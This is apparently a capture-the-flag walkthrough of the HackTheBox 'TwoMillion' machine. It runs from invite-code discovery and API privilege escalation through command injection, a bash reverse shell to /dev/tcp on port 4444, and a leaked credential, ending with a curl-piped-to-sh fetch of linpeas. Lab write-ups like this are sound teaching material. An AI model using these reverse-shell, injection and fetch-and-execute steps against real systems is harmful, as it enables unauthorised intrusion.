Nmap scan the target for available TCP ports

![nmap scan](/captures/screens/TwoMillion/shot-001.png)

---

To be able to view the website in browser the target IP must be resolved by creating a domain mapping in /etc/hosts

![/etc/hosts](/captures/screens/TwoMillion/shot-002.png)

---

We run burpsuite and examine the available path of the target under the 'target' tab

Under http://2million.htb/invite it is observed that an invite code is required for Sign Up

![/invite](/captures/screens/TwoMillion/shot-003.png)

After further examination of the website's source, under js/invite.min.js an eval based javascript packer obfuscation script is found in the response window of burpsuite.

![obfuscated script](/captures/screens/TwoMillion/shot-004.png)

Utilizing https://tunganhken.github.io/de4js/ the obfuscated JavaScript was deobfuscated and beautified, revealing functions that directly invoke backend API endpoints.

![beautified script](/captures/screens/TwoMillion/shot-005.png)

Then using curl a POST request is sent to the backend endpoint, with a ROT13 cipher 'data' value.

![rot13 cipher](/captures/screens/TwoMillion/shot-006.png)

https://cryptii.com/pipes/rot13-decoder is a web tool that helped with the decipher of the provided ROT13. 

The cipher's output:
- In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate

Thus, we test the newly found endpoint resulting to a base64 encoded 'code' value.

![base64 encoded](/captures/screens/TwoMillion/shot-007.png)

The encoded string can be decoded with https://www.base64decode.org/. 

The decoded string based on the generated base64 encoding:
- X43BI-41KBY-4HMSL-SYVEG

Once the decoded string is filled in the empty box of /invite, we get redirected to /register for registration. Next, the appropriate details are entered in /login and access to our personal /home page is granted.

![/home](/captures/screens/TwoMillion/shot-008.png)

After, further examination of the website, it is found that only within /home/access two endpoints share the same prefix /api/v1. It is observed by hovering over 'Connection Pack' and 'Regenerate' buttons.

Thus, a browse to http://2million.htb/api/v1 various other endpoints are displayed.

Note: To be able to view /api/v1 responses, the current created user must be logged in. Since the namespace requires authentication via PHPSESSID. 

![shot-009](/captures/screens/TwoMillion/shot-009.png)

Three endpoints were exposed related to admin, with each respective HTTP method:
- /api/v1/admin/auth
- /api/v1/admin/vpn/generate
- /api/v1/admin/settings/update

Next, using Burpsuite we request each admin related endpoint with the appropriate HTTP method as identified in /api/v1 namespace.

![shot-010](/captures/screens/TwoMillion/shot-010.png)

A GET request to /api/v1/admin/auth provides a json response message, indicating that the current logged in user is not an admin.

![shot-011](/captures/screens/TwoMillion/shot-011.png)

Since, the current user is does not have administrative access, a POST request to /api/v1/admin/vpn/generate, provides a response indicating that we are unauthorized.

![shot-012](/captures/screens/TwoMillion/shot-012.png)

Next, a PUT request to /api/v1/admin/settings/update, shows a response that could be tampered. It appears again that the content type the API accepts as request is application/json.

![shot-013](/captures/screens/TwoMillion/shot-013.png)

On line 11 of the request the content type is specified, and some dummy key:value pair is added to test the response behavior. A message is hinted that an email parameter is missing.


<!-- screenshots:anchor -->

When a valid email is added to the json structure, a new message appears, specifying that is_admin also must be added to the structure.

### shot-014
![shot-014](/captures/screens/TwoMillion/shot-014.png)

As properly assumed, is_admin is a boolean variable. Hence by passing a value of 1, in the response's json struct key is_admin is set to 1 (true).

### shot-015
![shot-015](/captures/screens/TwoMillion/shot-015.png)

When a new GET request is made in /api/v1/admin/auth, the response indicates that the created user now has administrative privileges.

### shot-016
![shot-016](/captures/screens/TwoMillion/shot-016.png)

The response from a reqest to /api/v1/admin/vpn/generate, contains an OpenVPN client profile generated by an administrative API endpoint. Including CA-signed client certificates and private key, potentially enabling direct VPN access to the internal network with elevated privileges.

Hence, the OpenVNP client generation, appeared like a system level operation. Which resulted in a command injection probe, that exposed some local directories of the target.

Environment variable values are key–value strings stored by the operating system and made available to running processes. Effectively, influencing application behaviors without changing code.

When probed the .env file of the target, various key-value pairs shown environment variables linked to the database of the application.

![shot-018](/captures/screens/TwoMillion/shot-018.png)

---

However, since execution of shell commands and bash is also available on the target, a bash reverse shell payload was injected to the json structure. Effectively allowing reverse communication to the aggressor, with system access.

nc -lvnp 4444 - the running listener on the aggressor.

![shot-019](/captures/screens/TwoMillion/shot-019.png)

bash -c 'bash -i >& /dev/tcp/10.10.15.190/4444 0>&1' - bash reverse shell command used in the burpsuite json request.

![shot-020](/captures/screens/TwoMillion/shot-020.png)

The established reverse shell on the aggressor.

![shot-021](/captures/screens/TwoMillion/shot-021.png)

At this point the user we are connected as is www-data. Nevertheless, according to the credentials found in .env we switch to the admin user with su admin and enter the password SuperDuperPass123.

Thus, we can view the user.txt flag, located in /home/admin.

Linpeas Enumeration

A python listener is set up on the attacker machine, where linpeas.sh is located. 

sudo python3 -m http.server 80

Hence, we obtain and execute linpeas.sh from the target using curl for a comprehensive system enumeration

curl <attacker_ip>/linpeas.sh | sh

As observed there were various findings, but what seemed of interest was an email exchange located in /var/mail. Indicating that the system is potentially vulnerable to CVE-2023-0386
